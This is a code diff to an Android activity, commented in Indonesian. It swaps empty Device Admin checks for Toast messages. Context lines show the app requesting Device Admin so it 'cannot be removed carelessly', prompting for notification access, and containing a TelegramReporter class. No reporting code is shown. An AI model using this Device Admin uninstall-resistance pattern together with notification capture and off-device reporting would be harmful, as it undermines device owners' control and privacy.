@@ -268,8 +268,8 @@ public class MainActivity extends Activity {
                     "Aktifkan admin agar aplikasi tidak bisa dihapus sembarangan.");
             startActivityForResult(intent, REQUEST_ADMIN);
         } else {
-            // ✅ FIX: tambahkan package name sebagai parameter kedua
-            // Device Admin aktif; setUninstallBlocked membutuhkan Device Owner/Profile Owner
+            // Device Admin sudah aktif
+            Toast.makeText(this, "Device Admin sudah aktif", Toast.LENGTH_SHORT).show();
         }
     }
 
@@ -381,7 +381,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // ✅ onResume() dengan pengecekan webView == null
+    // ✅ onResume() - TANPA setUninstallBlocked
     // ============================================================
     @Override
     protected void onResume() {
@@ -395,12 +395,8 @@ public class MainActivity extends Activity {
             showNotificationAccessDialog();
         }
 
-        // ✅ FIX: tambahkan package name
-        if (devicePolicyManager != null && adminComponent != null) {
-            if (devicePolicyManager.isAdminActive(adminComponent)) {
-                // Device Admin aktif; setUninstallBlocked membutuhkan Device Owner/Profile Owner
-            }
-        }
+        // Device Admin sudah dihandle di activateDeviceAdmin()
+        // Tidak perlu setUninstallBlocked di sini
 
         mainHandler.postDelayed(() -> {
             if (isFinishing() || isDestroyed() || notificationRequestPending) return;
@@ -423,12 +419,8 @@ public class MainActivity extends Activity {
         } else if (requestCode == REQUEST_ENABLE_BLUETOOTH && resultCode == RESULT_OK) {
             choosePrinter();
         } else if (requestCode == REQUEST_ADMIN && resultCode == RESULT_OK) {
-            // ✅ FIX: tambahkan package name
-            if (devicePolicyManager != null && adminComponent != null) {
-                if (devicePolicyManager.isAdminActive(adminComponent)) {
-                    // Device Admin aktif; setUninstallBlocked membutuhkan Device Owner/Profile Owner
-                }
-            }
+            // Device Admin berhasil diaktifkan
+            Toast.makeText(this, "Device Admin aktif", Toast.LENGTH_SHORT).show();
         }
     }
 
@@ -1451,7 +1443,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // TELEGRAMREPORTER (tidak berubah banyak)
+    // TELEGRAMREPORTER (tidak berubah)
     // ============================================================
     private final class TelegramReporter {
         private static final String STORE = "vannota_secure";
